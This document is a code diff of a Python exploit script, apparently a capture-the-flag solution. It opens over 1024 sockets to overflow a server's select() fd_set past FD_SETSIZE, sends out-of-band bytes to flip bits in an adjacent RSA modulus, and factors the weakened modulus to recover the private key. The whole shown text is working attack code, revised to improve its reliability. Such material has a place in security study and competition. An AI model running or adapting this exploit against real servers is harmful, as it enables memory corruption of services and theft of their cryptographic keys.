@@ -70,6 +70,8 @@ def make_connections(host, port, num_clients):
     for i in range(num_clients):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Set a long timeout
+            sock.settimeout(300)
             sock.connect((host, port))
             sockets.append(sock)
             print(".", end='', flush=True)
@@ -265,9 +267,6 @@ def solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus):
                     print(f"WARNING: Tried too many times; giving up")
                     already_tried.remove(s)
                     break
-                resume_client(r)
-                time.sleep(0.1)
-                pause_client(r)
                 e, modulus = get_key(r)
                 if num_bits_set(modulus) == controlled_bits:
                     print(f"WARNING: Key has {controlled_bits} bits set; this means that FD_SET has filled the fdset but select() has not returned yet.")
@@ -277,6 +276,9 @@ def solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus):
                 print(f"Prd: {predicted.hex()} ({guessed})")
                 if guessed != "CORRECT":
                     print(f"WARNING: Prediction was wrong; trying again...")
+                    resume_client(r)
+                    time.sleep(0.1)
+                    pause_client(r)
                     # already_tried = set(get_bit_pattern_from_key(modulus))
                 else:
                     break
@@ -291,63 +293,6 @@ def solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus):
         if key:
             return key
     return None
-
-def solve_randbits(r, csock, overflow_sockets, controlled_bits, initial_modulus, k=3, tries=10):
-    current_modulus = initial_modulus
-    for _ in range(tries):
-        # Clear any previous attempts
-        clear_bit_pattern(csock)
-        # Pick k random bits to set
-        bits_to_set = random.sample(set(range(len(overflow_sockets))), k)
-        print(f"Trying to set bits {bits_to_set}")
-        predicted = predict_bit_pattern(bits_to_set, controlled_bits)
-        for s in bits_to_set:
-            sock = overflow_sockets[s]
-            sock.send(b'1', socket.MSG_OOB)
-        # Pause the client thread so that it doesn't overwrite the key
-        with PausedClient(r):
-            e, modulus = get_key(r)
-            compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
-            guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
-            print(f"Prd: {predicted.hex()} ({guessed})")
-            if modulus == current_modulus:
-                print(f"WARNING: Key is unchanged; something went wrong :(")
-                # No point trying to factor the same modulus again
-                continue
-        current_modulus = modulus
-        key = try_factor(modulus, e)
-        if key:
-            return key
-    return None
-
-def test_bitset(r, csock, sockets, controlled_bits, initial_modulus):
-    overflow_sockets = {i-1024: s for i,s in sockets.items() if i >= 1024}
-    print(f"Overflow sockets: {overflow_sockets}")
-    # Try setting bits one by one
-    current_modulus = initial_modulus
-    for s in range(len(overflow_sockets)-1, -1, -1):
-        print(f"Trying to set bit {s}")
-        predicted = predict_bit_pattern(set(range(s, len(overflow_sockets))), controlled_bits)
-        sock = overflow_sockets[s]
-        sock.send(b'1', socket.MSG_OOB)
-        time.sleep(1)
-        # Pause the client thread so that it doesn't overwrite the key
-        with PausedClient(r):
-            while True:
-                e, modulus = get_key(r)
-                compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
-                guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
-                print(f"Prd: {predicted.hex()} ({guessed})")
-                if guessed != "CORRECT":
-                    print(f"WARNING: Prediction was wrong; trying again...")
-                else:
-                    break
-                resume_client(r)
-                sock = sockets[s]
-                sock.send(b'1', socket.MSG_OOB)
-                time.sleep(1)
-                pause_client(r)
-        current_modulus = modulus
 
 # Context wrapper that pauses the client thread
 class PausedClient:
@@ -377,16 +322,9 @@ def solve(args):
     sockets = make_connections(args.host, client_port, args.num_clients - 1)
     print(f"\nConnected {len(sockets)} clients")
 
-    # The server uses fds 0-6 internally, assuming one client:
-    #   (stdin, stdout, stderr, control_listen, control_accept, client_listen, client_accept)
-    # and FD_SETSIZE is 1024. So the bits we control are len(sockets) - 1024 + 7
-    controlled_bits = len(sockets) + 1 - 1024 + 7
-    print(f"Controlled bits: {controlled_bits}")
-
-    # Test that we can set bits
-    # test_bitset(r, csock, sockets, controlled_bits, initial_modulus)
-    # return
     overflow_sockets = {i-1024: s for i,s in sockets.items() if i >= 1024}
+    controlled_bits = len(overflow_sockets)
+    print("Controlled bits:", controlled_bits)
 
     key = solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus)
     if key is None:
